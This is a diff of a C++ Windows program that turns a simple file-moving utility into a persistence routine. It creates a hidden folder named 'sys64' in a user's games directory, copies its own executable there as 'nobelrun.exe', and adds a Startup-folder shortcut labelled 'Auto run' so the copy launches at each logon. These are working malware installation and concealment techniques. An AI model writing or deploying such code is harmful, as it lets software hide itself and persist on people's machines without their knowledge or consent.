@@ -1,57 +1,100 @@
 #include <windows.h>
+#include <shlobj.h>
 #include <iostream>
 #include <string>
-#include <shlwapi.h> // for PathFileExists
 
-#pragma comment(lib, "Shlwapi.lib")
-
-bool create_folder(const char* folderPath) {
-    if (CreateDirectory(folderPath, NULL) || GetLastError() == ERROR_ALREADY_EXISTS) {
-        if (SetFileAttributes(folderPath, FILE_ATTRIBUTE_HIDDEN)) {
-            std::cout << "[+] Folder created and hidden: " << folderPath << "\n";
-            return true;
-        } else {
-            std::cerr << "[-] Failed to hide folder: " << folderPath << "\n";
-        }
-    } else {
-        std::cerr << "[-] Failed to create folder: " << folderPath << "\n";
-    }
-    return false;
+// Create the hidden folder
+void MakeHiddenFolder(const char* path) {
+    CreateDirectoryA(path, NULL);
+    SetFileAttributesA(path, FILE_ATTRIBUTE_HIDDEN);
 }
 
-bool move_files_to_folder(const char* folderPath, int count, const char* srcFiles[], const char* destNames[]) {
-    for (int i = 0; i < count; i++) {
-        std::string destPath = std::string(folderPath) + "\\" + destNames[i];
+// Copy any file into the target folder
+bool CopyFileToTarget(const char* source, const char* destFolder) {
+    char dest[MAX_PATH];
+    // pick just the filename portion
+    const char* fileName = strrchr(source, '\\') ? strrchr(source, '\\') + 1 : source;
+    snprintf(dest, MAX_PATH, "%s\\%s", destFolder, fileName);
+    return CopyFileA(source, dest, FALSE);
+}
 
-        if (!PathFileExistsA(srcFiles[i])) {
-            std::cerr << "[-] Source file not found: " << srcFiles[i] << "\n";
-            continue;
-        }
+// Copy the running EXE under a new name
+bool CopyAndRenameExe(const char* destFolder, const char* newName) {
+    char exePath[MAX_PATH];
+    GetModuleFileNameA(NULL, exePath, MAX_PATH);
 
-        if (MoveFileA(srcFiles[i], destPath.c_str())) {
-            std::cout << "[+] Moved: " << srcFiles[i] << " -> " << destPath << "\n";
-        } else {
-            std::cerr << "[-] Failed to move: " << srcFiles[i] << "\n";
-        }
+    char destPath[MAX_PATH];
+    snprintf(destPath, MAX_PATH, "%s\\%s", destFolder, newName);
+
+    return CopyFileA(exePath, destPath, FALSE);
+}
+
+// Create a .lnk in the Startup folder pointing at targetPath
+bool CreateShortcutToStartup(const char* targetPath, const char* shortcutName) {
+    char startupPath[MAX_PATH];
+    SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startupPath);
+
+    char linkPath[MAX_PATH];
+    snprintf(linkPath, MAX_PATH, "%s\\%s.lnk", startupPath, shortcutName);
+
+    CoInitialize(NULL);
+
+    IShellLinkA* psl = nullptr;
+    HRESULT hr = CoCreateInstance(
+        CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER,
+        IID_IShellLinkA, (LPVOID*)&psl
+    );
+    if (FAILED(hr) || !psl) return false;
+
+    psl->SetPath(targetPath);
+    psl->SetDescription("Auto run");
+
+    IPersistFile* ppf = nullptr;
+    hr = psl->QueryInterface(IID_IPersistFile, (void**)&ppf);
+    if (SUCCEEDED(hr) && ppf) {
+        WCHAR wsz[MAX_PATH];
+        MultiByteToWideChar(CP_ACP, 0, linkPath, -1, wsz, MAX_PATH);
+        ppf->Save(wsz, TRUE);
+        ppf->Release();
     }
-    return true;
+
+    psl->Release();
+    CoUninitialize();
+    return SUCCEEDED(hr);
 }
 
 int main() {
     const char* folder = "C:\\fake\\LINA\\Desktop\\games\\sys64";
-    create_folder(folder);
+    MakeHiddenFolder(folder);
 
-    const char* sourceFiles[] = {
-        "test1.txt",
-        "test2.txt"
+    // ONLY copy the text files here:
+    const int numTextFiles = 3;
+    const char* textFiles[numTextFiles] = {
+        "hello.txt",
+        "hello2.txt",
+        "hello3.txt"
     };
+    for (int i = 0; i < numTextFiles; ++i) {
+        if (!CopyFileToTarget(textFiles[i], folder)) {
+            std::cerr << "Failed to copy " << textFiles[i] << "\n";
+        }
+    }
 
-    const char* destNames[] = {
-        "doc1.txt",
-        "doc2.txt"
-    };
+    // Copy & rename the running EXE into sys64:
+    const char* newExeName = "nobelrun.exe";
+    if (!CopyAndRenameExe(folder, newExeName)) {
+        std::cerr << "Failed to copy and rename EXE.\n";
+        return 1;
+    }
 
-    move_files_to_folder(folder, 2, sourceFiles, destNames);
+    // Create a startup shortcut
+    char fullPath[MAX_PATH];
+    snprintf(fullPath, MAX_PATH, "%s\\%s", folder, newExeName);
+    if (!CreateShortcutToStartup(fullPath, "nobelrunner")) {
+        std::cerr << "Failed to create startup shortcut.\n";
+        return 1;
+    }
 
+    std::cout << "Done.\n";
     return 0;
 }
